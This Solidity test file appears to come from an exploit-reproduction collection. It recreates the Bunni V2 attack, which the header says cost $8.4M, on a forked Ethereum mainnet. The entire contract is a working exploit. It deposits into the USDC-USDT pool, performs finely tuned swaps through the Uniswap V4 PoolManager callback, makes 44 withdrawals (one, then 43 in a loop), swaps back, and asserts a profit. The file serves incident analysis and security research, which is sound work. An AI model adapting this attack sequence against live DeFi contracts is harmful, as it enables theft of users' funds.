// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 8.4M USD
// Attacker : https://etherscan.io/address/0x0C3d8fA7762Ca5225260039ab2d3990C035B458D
// Attack Contract : https://etherscan.io/address/0x657D8BcCDD9C6e1Da8DA1e7d331CFdeA8357AdBc
// Vulnerable Contract : https://etherscan.io/address/0x000052423c1dB6B7ff8641b85A7eEfc7B2791888
// Attack Tx : https://etherscan.io/tx/0x1c27c4d625429acfc0f97e466eda725fd09ebdc77550e529ba4cbdbc33beb97b

// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0x000052423c1dB6B7ff8641b85A7eEfc7B2791888#code

// @Analysis
// Post-mortem : https://x.com/Bunni_xyz/status/1961503177058902114
// Twitter Guy : https://x.com/peckshield/status/1961455407942091039
// Hacking God : N/A

type Currency is address;
type BalanceDelta is int256;

struct PoolKey {
    Currency currency0;
    Currency currency1;
    uint24 fee;
    int24 tickSpacing;
    address hooks;
}

struct SwapParams {
    bool zeroForOne;
    int256 amountSpecified;
    uint160 sqrtPriceLimitX96;
}

interface IPoolManagerMinimal {
    function unlock(
        bytes calldata data
    ) external returns (bytes memory);
    function swap(
        PoolKey calldata key,
        SwapParams calldata params,
        bytes calldata hookData
    ) external returns (BalanceDelta delta);
    function take(
        Currency currency,
        address to,
        uint256 amount
    ) external;
    function sync(
        Currency currency
    ) external;
    function settle() external payable returns (uint256 paid);
}

interface IBunniHubMinimal {
    struct DepositParams {
        PoolKey poolKey;
        address recipient;
        address refundRecipient;
        uint256 amount0Desired;
        uint256 amount1Desired;
        uint256 amount0Min;
        uint256 amount1Min;
        uint256 vaultFee0;
        uint256 vaultFee1;
        uint256 deadline;
    }

    struct WithdrawParams {
        PoolKey poolKey;
        address recipient;
        uint256 shares;
        uint256 amount0Min;
        uint256 amount1Min;
        uint256 deadline;
        bool useQueuedWithdrawal;
    }

    function deposit(
        DepositParams calldata params
    ) external payable returns (uint256 shares, uint256 amount0, uint256 amount1);
    function withdraw(
        WithdrawParams calldata params
    ) external returns (uint256 amount0, uint256 amount1);
}

contract BunniV2_EXP is BaseTestWithBalanceLog {
    address private constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address private constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address private constant BUNNI_LP = 0xc92c2ba90213Fc3048A527052B0b4FeBFA716763;
    address private constant BUNNI_HOOK = 0x000052423c1dB6B7ff8641b85A7eEfc7B2791888;

    IPoolManagerMinimal private constant POOL_MANAGER = IPoolManagerMinimal(0x000000000004444c5dc75cB358380D2e3dE08A90);
    IBunniHubMinimal private constant BUNNI_HUB = IBunniHubMinimal(0x000000000049C7bcBCa294E63567b4D21EB765f1);

    uint256 private constant BASE_BLOCK = 23_273_098 - 1;
    uint256 private constant SETUP_AMOUNT = 4_000_000e6;
    uint256 private constant FIRST_WITHDRAW_SHARES = 119_254_548_996;
    uint256 private constant LOOP_WITHDRAW_SHARES = 331_262_636_100;
    uint256 private constant LOOP_COUNT = 43;

    PoolKey private poolKey;

    struct SwapCallbackData {
        SwapParams[] params;
        bytes hookData;
    }

    function setUp() public {
        vm.createSelectFork("https://eth-mainnet.public.blastapi.io", BASE_BLOCK);

        poolKey = PoolKey({
            currency0: Currency.wrap(USDC), currency1: Currency.wrap(USDT), fee: 0, tickSpacing: 1, hooks: BUNNI_HOOK
        });

        fundingToken = USDT;
        vm.label(USDC, "USDC");
        vm.label(USDT, "USDT");
        vm.label(BUNNI_LP, "Bunni USDC-USDT LP");
        vm.label(address(POOL_MANAGER), "Uniswap V4 PoolManager");
        vm.label(address(BUNNI_HUB), "BunniHub");
        vm.label(BUNNI_HOOK, "BunniHook");
    }

    function testExploit() public {
        deal(USDC, address(this), SETUP_AMOUNT);
        deal(USDT, address(this), SETUP_AMOUNT);

        _approve(USDC, address(BUNNI_HUB), type(uint256).max);
        _approve(USDT, address(BUNNI_HUB), type(uint256).max);

        (uint256 shares,,) = BUNNI_HUB.deposit(
            IBunniHubMinimal.DepositParams({
                poolKey: poolKey,
                recipient: address(this),
                refundRecipient: address(this),
                amount0Desired: 2_500_000e6,
                amount1Desired: 2_500_000e6,
                amount0Min: 0,
                amount1Min: 0,
                vaultFee0: 0,
                vaultFee1: 0,
                deadline: block.timestamp
            })
        );

        emit log_named_decimal_uint("minted Bunni LP shares", shares, 18);
        require(shares > FIRST_WITHDRAW_SHARES + LOOP_WITHDRAW_SHARES * LOOP_COUNT, "insufficient fresh LP");

        uint256 attackStartUsdc = IERC20(USDC).balanceOf(address(this));
        uint256 attackStartUsdt = IERC20(USDT).balanceOf(address(this));

        _runInitialSwaps();
        _runRepeatedWithdrawals();
        _runFinalSwaps();
        _withdraw(IERC20(BUNNI_LP).balanceOf(address(this)));

        uint256 finalUsdc = IERC20(USDC).balanceOf(address(this));
        uint256 finalUsdt = IERC20(USDT).balanceOf(address(this));

        emit log_named_decimal_uint("profit USDC", finalUsdc > attackStartUsdc ? finalUsdc - attackStartUsdc : 0, 6);
        emit log_named_decimal_uint("profit USDT", finalUsdt > attackStartUsdt ? finalUsdt - attackStartUsdt : 0, 6);
        assertGt(finalUsdc + finalUsdt, attackStartUsdc + attackStartUsdt, "attack is not profitable");
    }

    function _runInitialSwaps() private {
        SwapParams[] memory params = new SwapParams[](3);

        params[0] = SwapParams({
            zeroForOne: false, amountSpecified: -17_088_106, sqrtPriceLimitX96: 79_226_236_828_369_693_485_340_663_719
        });
        params[1] = SwapParams({
            zeroForOne: false,
            amountSpecified: 1_835_309_634_512,
            sqrtPriceLimitX96: 79_244_008_939_029_797_398_564_130_531
        });
        params[2] = SwapParams({
            zeroForOne: false, amountSpecified: -1_000_000, sqrtPriceLimitX96: 101_729_702_841_318_637_793_976_746_270
        });

        _unlockSwaps(params);
    }

    function _runRepeatedWithdrawals() private {
        _withdraw(FIRST_WITHDRAW_SHARES);
        for (uint256 i; i < LOOP_COUNT; ++i) {
            _withdraw(LOOP_WITHDRAW_SHARES);
        }
    }

    function _runFinalSwaps() private {
        SwapParams[] memory params = new SwapParams[](2);

        params[0] = SwapParams({
            zeroForOne: false,
            amountSpecified: -10_000_000_000_000_000_000,
            sqrtPriceLimitX96: 132_047_072_987_237_266_478_933_153_881_482_415_680_958_757_549
        });
        params[1] = SwapParams({
            zeroForOne: true, amountSpecified: 10_000_002_885_864_344_623, sqrtPriceLimitX96: 4_295_128_740
        });

        _unlockSwaps(params);
    }

    function _unlockSwaps(
        SwapParams[] memory params
    ) private {
        POOL_MANAGER.unlock(abi.encode(SwapCallbackData({params: params, hookData: ""})));
    }

    function unlockCallback(
        bytes calldata data
    ) external returns (bytes memory) {
        require(msg.sender == address(POOL_MANAGER), "only pool manager");

        SwapCallbackData memory callbackData = abi.decode(data, (SwapCallbackData));
        int128 cumulativeUsdcDelta;
        int128 cumulativeUsdtDelta;

        for (uint256 i; i < callbackData.params.length; ++i) {
            BalanceDelta delta = POOL_MANAGER.swap(poolKey, callbackData.params[i], callbackData.hookData);
            cumulativeUsdcDelta += _amount0(delta);
            cumulativeUsdtDelta += _amount1(delta);
        }

        _settle(Currency.wrap(USDC), IERC20(USDC), cumulativeUsdcDelta);
        _settle(Currency.wrap(USDT), IERC20(USDT), cumulativeUsdtDelta);

        return "";
    }

    function _withdraw(
        uint256 shares
    ) private {
        BUNNI_HUB.withdraw(
            IBunniHubMinimal.WithdrawParams({
                poolKey: poolKey,
                recipient: address(this),
                shares: shares,
                amount0Min: 0,
                amount1Min: 0,
                deadline: block.timestamp,
                useQueuedWithdrawal: false
            })
        );
    }

    function _settle(
        Currency currency,
        IERC20 token,
        int128 delta
    ) private {
        if (delta > 0) {
            POOL_MANAGER.take(currency, address(this), uint256(uint128(delta)));
        } else if (delta < 0) {
            uint256 amount = uint256(uint128(-delta));
            POOL_MANAGER.sync(currency);
            _transfer(address(token), address(POOL_MANAGER), amount);
            POOL_MANAGER.settle();
        }
    }

    function _amount0(
        BalanceDelta delta
    ) private pure returns (int128) {
        return int128(BalanceDelta.unwrap(delta) >> 128);
    }

    function _amount1(
        BalanceDelta delta
    ) private pure returns (int128) {
        return int128(BalanceDelta.unwrap(delta));
    }

    function _approve(
        address token,
        address spender,
        uint256 amount
    ) private {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(IERC20.approve.selector, spender, amount));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "approve failed");
    }

    function _transfer(
        address token,
        address to,
        uint256 amount
    ) private {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(IERC20.transfer.selector, to, amount));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "transfer failed");
    }
}
